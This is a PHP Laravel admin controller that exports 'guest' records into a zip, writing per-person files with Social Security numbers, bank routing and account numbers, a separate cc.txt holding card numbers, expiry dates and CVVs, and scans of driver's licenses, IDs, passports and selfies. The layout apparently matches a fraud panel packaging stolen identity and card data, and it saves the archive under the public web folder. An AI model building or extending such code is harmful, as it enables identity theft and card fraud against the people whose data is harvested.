<?php
namespace App\Http\Controllers\Admin\Dashboard;

use App\Http\Controllers\Controller;
use App\Models\Guest;
use Illuminate\Http\Request;
use ZipArchive;

class DownloadController extends Controller
{
    public function __invoke(Request $request)
    {
        // Проверяем, установлен ли параметр select_all
        if ($request->has('select_all') && $request->input('select_all') === 'true') {
            $guests = Guest::all();
        } else {
            $selectedGuestIds = explode(',', $request->input('selected_guests', ''));
            $guests = Guest::whereIn('id', $selectedGuestIds)->get();
            dd($guests);
        }
        $zip = new ZipArchive;
        $zipFileName = 'guests_data.zip';
        $zipFilePath = public_path($zipFileName);

        // Удаление старого файла
        if (file_exists($zipFilePath)) {
            unlink($zipFilePath);
        }

        if ($zip->open($zipFilePath, ZipArchive::CREATE) === TRUE) {
            foreach ($guests as $guest) {
                $guest = Guest::with(['bank', 'documents'])->find($guest->id);

                if ($guest) {
                    $folderName = "{$guest->name} - {$guest->state}";
                    $zip->addEmptyDir($folderName);

                    // Add data.txt
                    $dataTxtContent = "Name: {$guest->name}\n"
                        . "Birth Date: {$guest->date_of_birth}\n"
                        . "Email: {$guest->email}\n"
                        . "Cell Phone: {$guest->cell_phone}\n"
                        . "Work Phone: {$guest->work_phone}\n"
                        . "Social Number: {$guest->social_number}\n"
                        . "Driver License Number: " . ($guest->documents->driving_number ?? 'N/A') . "\n"
                        . "Home Zip Code: {$guest->zip_code}\n"
                        . "Street: {$guest->address}\n"
                        . "City: {$guest->city}\n"
                        . "State: {$guest->state}\n"
                        . "Country: {$guest->country}\n"
                        . "Years At Address: {$guest->address_years}\n"
                        . "Residential Status: {$guest->residential_status}\n"
                        . "Bank Name: " . ($guest->bank->bank_name ?? 'N/A') . "\n"
                        . "Routing Number: " . ($guest->bank->routing_number ?? 'N/A') . "\n"
                        . "Account Number: " . ($guest->bank->account_number ?? 'N/A') . "\n"
                        . "Bank Years: " . ($guest->bank->bank_year ?? 'N/A') . "\n"
                        . "Employment Status: \n"
                        . "Job Title: " . ($guest->job_info->job_title ?? 'N/A') . "\n"
                        . "Employer Name: " . ($guest->job_info->employer_name ?? 'N/A') . "\n"
                        . "Employment Status Length: " . ($guest->job_info->employment_length ?? 'N/A') . "\n"
                        . "Payment Type: \n"
                        . "How Often Get Paid: \n"
                        . "Salary: " . ($guest->job_info->salary ?? 'N/A') . "\n";
                    $zip->addFromString("$folderName/data.txt", $dataTxtContent);

                    // Add cc.txt
                    if ($guest->bank) {
                        $ccTxtContent = "Credit Card: {$guest->bank->card_number}\n"
                            . "Expire Date: {$guest->bank->expiration_date}\n"
                            . "CVV: {$guest->bank->cvv}\n"
                            . "Street: {$guest->address}\n"
                            . "City: {$guest->city}\n"
                            . "State: {$guest->state}\n"
                            . "Zip Code: {$guest->zip_code}\n"
                            . "Email: {$guest->email}\n"
                            . "Cell Phone: {$guest->cell_phone}\n"
                            . "Birth Date: {$guest->date_of_birth}\n"
                            . "Social Number: {$guest->social_number}\n"
                            . "Driver License Number: " . ($guest->documents->driving_number ?? 'N/A') . "\n";
                        $zip->addFromString("$folderName/cc.txt", $ccTxtContent);
                    }

                    // Add images
                    if ($guest->documents) {
                        if ($guest->documents->driving_front) {
                            $zip->addFile(storage_path("app/public/{$guest->documents->driving_front}"), "$folderName/driving_front.jpg");
                        }
                        if ($guest->documents->driving_back) {
                            $zip->addFile(storage_path("app/public/{$guest->documents->driving_back}"), "$folderName/driving_back.jpg");
                        }
                        if ($guest->documents->id_front) {
                            $zip->addFile(storage_path("app/public/{$guest->documents->id_front}"), "$folderName/id_front.jpg");
                        }
                        if ($guest->documents->id_back) {
                            $zip->addFile(storage_path("app/public/{$guest->documents->id_back}"), "$folderName/id_back.jpg");
                        }
                        if ($guest->documents->passport) {
                            $zip->addFile(storage_path("app/public/{$guest->documents->passport}"), "$folderName/passport.jpg");
                        }
                        if ($guest->documents->additional_document) {
                            $zip->addFile(storage_path("app/public/{$guest->documents->additional_document}"), "$folderName/additional_document.jpg");
                        }
                        if ($guest->documents->selfie) {
                            $zip->addFile(storage_path("app/public/{$guest->documents->selfie}"), "$folderName/selfie.jpg");
                        }
                    }
                }
            }

            $zip->close();
        }

        if (file_exists($zipFilePath)) {
            return response()->download($zipFilePath)->deleteFileAfterSend(true);
        } else {
            return redirect()->back()->with('error', 'Could not create zip file.');
        }
    }
}
